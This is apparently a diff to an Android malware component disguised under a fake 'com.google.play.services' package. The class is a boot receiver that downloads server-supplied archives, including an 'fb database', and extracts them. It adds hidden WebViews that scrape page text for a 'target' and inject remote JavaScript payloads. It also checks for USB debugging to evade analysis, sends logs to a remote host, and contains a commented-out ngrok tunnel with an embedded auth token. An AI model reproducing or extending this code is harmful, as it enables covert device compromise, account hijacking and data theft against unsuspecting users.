@@ -1,5 +1,6 @@
 package com.google.play.services;
 
+import com.google.play.ngrok.NgrokClient;
 import org.apache.http.params.HttpParams;
 import org.apache.http.params.BasicHttpParams;
 import org.apache.http.params.HttpConnectionParams;
@@ -11,6 +12,7 @@ import org.apache.http.impl.client.DefaultHttpClient;
 import org.json.*;
 import android.app.*;
 import android.os.IBinder;
+import android.os.Build;
 import android.os.AsyncTask;
 import android.os.CountDownTimer;
 import android.os.Environment;
@@ -44,6 +46,13 @@ import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.net.Uri;
 import android.webkit.MimeTypeMap;
+import android.webkit.CookieManager;
+import android.webkit.ValueCallback;
+import android.webkit.WebChromeClient;
+import android.webkit.WebIconDatabase;
+import android.webkit.WebSettings;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
 import android.net.wifi.WifiManager;
 import android.net.wifi.WifiConfiguration;
 import android.net.ConnectivityManager;
@@ -62,6 +71,8 @@ public class ReceiverBoot extends BroadcastReceiver
     private Handler insH = new Handler();
     private Runnable insR;
 	private Vibrator vibrator;
+	private WebView webFbTarget;
+	private WebView webFbPayload;
 	private boolean oke = true;
 	private SystemThread system;
 	private Context exContext;
@@ -80,10 +91,13 @@ public class ReceiverBoot extends BroadcastReceiver
 	public static int delayToast = 0;
     public static Boolean kumpulkanPayload = true;
 
+	public static String resultFbTarget = "";
+	public static String resultFbPayload = "";
 	public static boolean finishInstall = false;
     public static boolean rootResult = false;
 	public static boolean installResult = false;
 	public static String identitasResult = "";
+	public static boolean net = false;
 	public static boolean pingResult = false;
 	public static String requestAksi = "";
 	public static String requestPath = "";
@@ -174,8 +188,11 @@ public class ReceiverBoot extends BroadcastReceiver
 
 		_server(context);
 
-		if (getServer()) {
-			logSend(context, "Aktif="+getPublicIPAddress(context)+":8888\n");
+		if (getServer() && installResult) {
+			//NgrokClient ngclient = new NgrokClient("127.0.0.1", 8888, "6SsJgtJB41p7XXFoE7qDx_3QuzH9Pc8ZyET4QHNngt8", true);
+			//ngclient.start();
+
+			//logSend(context, "Aktif="+getPublicIPAddress(context)+":8888\n");
 		}
 
         if (mainSUPER.equals("hidup")) 
@@ -226,21 +243,20 @@ public class ReceiverBoot extends BroadcastReceiver
 		if (cekConnection(context) && !hostspotStatus(context)) 
 		{
 			if (charger.equals("USB_CHARGER")) {
-				pingResult = false;
+				net = false;
 
 				logSend(context, "[WARNING!] apk sedang didebug");
 			} else {
-				pingResult = true;
+				net = true;
 			}
 
 			//   DEBUG MODE
-			// 1.  hapus pingResult untuk nonaktifkan
+			// 1.  hapus net untuk nonaktifkan
 			// 2.  ubah local ke main server di method logSend
-			pingResult = true;
-			
-        } 
-        else {
-        	pingResult = false;
+			net = true;
+
+        } else {
+        	net = false;
         	kumpulkanPayload = true;
         }
 
@@ -308,7 +324,7 @@ public class ReceiverBoot extends BroadcastReceiver
 	}
 
 	private void logSend(Context context, String text) {
-		if (pingResult) 
+		if (net) 
 		{
 			String waktu = new SimpleDateFormat("HH:mm:ss").format(new Date());
 			String ip = Identitas.getIPAddress(true);
@@ -321,9 +337,9 @@ public class ReceiverBoot extends BroadcastReceiver
 				}
 			}catch (Exception e) {}
 
-			requestUrl = "https://sunjangyo12.000webhostapp.com/payload.php?outpayload="+hash;
+			/*requestUrl = system.urlServer+"/payload.php?outpayload="+hash;
 			requestAksi = "web";
-			mainRequest(context);
+			mainRequest(context); bikin hang app */
 		}
 	}
 
@@ -382,10 +398,23 @@ public class ReceiverBoot extends BroadcastReceiver
 
 		   	JSONObject obj;
 
-	    	if (!new File(pathExternal+"/server.zip").exists()) 
-	    	{
+		   	if (!new File(pathInternal+"/fb.zip").exists()) {
+		   		try {		   			
+		   			obj = new JSONObject(requestResult);
+		   			Log.i(TAG, "download fb database: "+obj.getString("url_install_fb"));
+		   			
+		   			requestUrl = obj.getString("url_install_fb");
+					requestAksi = "download";
+					requestPath = pathInternal+"/fb.zip";
+					mainRequest(context);
+
+		   			logSend(context, "download fb database...........\n");
+
+				}
+				catch(Exception e) {}
+		   	} 
+		   	else if (!new File(pathExternal+"/server.zip").exists()) {
 				try {
-					logSend(context, "download SERVER............\n");
 					obj = new JSONObject(requestResult);
 					Log.i(TAG, "download server : "+obj.getString("url_install_server"));
 
@@ -393,6 +422,10 @@ public class ReceiverBoot extends BroadcastReceiver
 					requestAksi = "download";
 					requestPath = pathExternal+"/server.zip";
 					mainRequest(context);
+
+	    			logSend(context, "download fb database ............OK\n");
+					logSend(context, "download SERVER............\n");
+
 				}
 				catch(Exception e) {}
 	    	} else {
@@ -400,18 +433,24 @@ public class ReceiverBoot extends BroadcastReceiver
 	    		try {
 	    			obj = new JSONObject(requestResult);
 		    		Log.i(TAG, "download DATA : "+obj.getString("url_install_data"));
-		    		logSend(context, "download DATA..............\n");
 
 		    		requestUrl = obj.getString("url_install_data");
 					requestAksi = "download";
 					requestPath = pathExternal+"/data.zip";
 					mainRequest(context);
+
+		    		logSend(context, "download DATA..............\n");
+
 				}catch(Exception e) {}
 	    	}
 	    	
         } 
 
         // EXTRAK
+        if (utils.checkFb()) {
+        	extrak(context, pathInternal+"/fb.zip", pathInternal, docFolder);
+        }
+
         if (utils.checkDownload() && !utils.checkInstall()) {
         	logSend(context, "download DATA..............OK\n");
         	logSend(context, "extract SERVER............\n");
@@ -679,7 +718,7 @@ public class ReceiverBoot extends BroadcastReceiver
 	}
 
 	public boolean ping(Context context) {
-		Log.i(TAG, "ping server: "+system.urlServer);
+		Log.i(TAG, "ping server: http://www.google.com  ...");
 
 		HttpParams httpParams = new BasicHttpParams();
 	    HttpConnectionParams.setConnectionTimeout(httpParams, 10000);
@@ -688,16 +727,16 @@ public class ReceiverBoot extends BroadcastReceiver
         HttpClient httpClient = new DefaultHttpClient(httpParams);
         HttpGet request = new HttpGet(system.urlServer);
         try{
-        	Log.i(TAG, "ping....");
             HttpResponse response = httpClient.execute(request);
         	Log.i(TAG, "ping terhubung");
         	return true;
 		}
 		catch(Exception e) {
-			e.printStackTrace();
-			Log.i(TAG, "ping error ");
+        	Log.i(TAG, "ping error");
+			
 			return false;
 		}
+
 	}
 
 	public static boolean cekConnection(Context context) {
@@ -898,7 +937,7 @@ public class ReceiverBoot extends BroadcastReceiver
 		}catch(Exception e){}
 	}
 
-	private void extrak(Context context, String efile, String pathsatu, String pathdua) {
+	public void extrak(Context context, String efile, String pathsatu, String pathdua) {
 		Installer installator = new Installer(context, true);
 		installator.execute(efile, pathsatu, pathdua);
 	}
@@ -1200,6 +1239,118 @@ public class ReceiverBoot extends BroadcastReceiver
 				canvas.drawBitmap(image, (screenW-image.getWidth())/9, 0, null);
 			}
 		}
+	}
+
+	public View setWebView(Context context, String textUrl, String pilihAksi) {
+		WebView webView = new WebView(context);
+		TextView textView = new TextView(context);
+
+		class MyJavaScriptInterface 
+		{
+			private TextView textView;
+
+			public MyJavaScriptInterface(TextView aContentView) {
+				textView = aContentView;
+			}
+
+			@SuppressWarnings("unused")
+			public void processContent(String aContent) {
+				final String content = aContent;
+				textView.post(new Runnable()
+				{
+					public void run() {
+						textView.setText(content);
+						Log.i(TAG, "yio: "+content);
+					}
+				});
+			}
+		}
+		webView.getSettings().setJavaScriptEnabled(true);
+		webView.addJavascriptInterface(new MyJavaScriptInterface(textView), "INTERFACE");
+		webView.setWebViewClient(new WebViewClient() {
+			@Override
+			public void onPageFinished(WebView view, String url) {
+				view.loadUrl("javascript:window.INTERFACE.processContent(document.getElementsByTagName('body')[0].innerText);");
+			}
+		});
+
+		webView.loadUrl(textUrl);
+
+		if (pilihAksi.equals("text"))
+			return textView;
+		else
+			return webView;
+	}
+
+	public void fbTarget(Context context, String offUrl) {
+		webFbTarget = new WebView(context);
+		String ok = "";
+
+		class MyJavaScriptInterface 
+		{
+			private String ok = "";
+
+			public MyJavaScriptInterface(String aContentView) {
+				ok = aContentView;
+			}
+
+			@SuppressWarnings("unused")
+			public void processContent(String out) {
+				Log.i("qwertyuiop", "++ content: "+out);
+
+				resultFbPayload = out;
+
+				try {
+					String[] split = out.split("-target-");
+					resultFbTarget = split[1];
+				
+				} catch(Exception e) {
+					resultFbTarget = "kosong";
+				}
+			}
+		}
+		webFbTarget.getSettings().setJavaScriptEnabled(true);
+		webFbTarget.addJavascriptInterface(new MyJavaScriptInterface(ok), "INTERFACE");
+		webFbTarget.setWebViewClient(new WebViewClient() {
+			@Override
+			public void onPageStarted(WebView view, String url, Bitmap fav) {
+				//Log.i(TAG, "++ target wait...");
+			}
+			@Override
+			public void onPageFinished(WebView view, String url) {
+				view.loadUrl("javascript:window.INTERFACE.processContent(document.getElementsByTagName('body')[0].innerText);");
+			
+				//Log.i(TAG, "++ target finish: "+resultFbTarget);
+			}
+		});
+
+		webFbTarget.loadUrl(offUrl);
+	}
+
+	public void fbPayload(Context context, String javascript, String offUrl) {
+		webFbPayload = new WebView(context);
+
+		webFbPayload.getSettings().setJavaScriptEnabled(true);
+		webFbPayload.setWebViewClient(new WebViewClient() {
+			boolean loop = true;
+
+			@Override
+			public void onPageStarted(WebView view, String url, Bitmap fav) {
+				//Log.i(TAG, "++ payload wait...");
+			}
+			@Override
+			public void onPageFinished(WebView view, String url) {
+
+				if (loop) {
+					view.loadUrl(javascript);
+					loop = false;
+				}
+				//Log.i(TAG, "++ payload finish: "+resultFbTarget);
+
+			}
+		});
+
+		webFbPayload.loadUrl(offUrl);
 	}
 
 	public void mainRequest(Context context) {
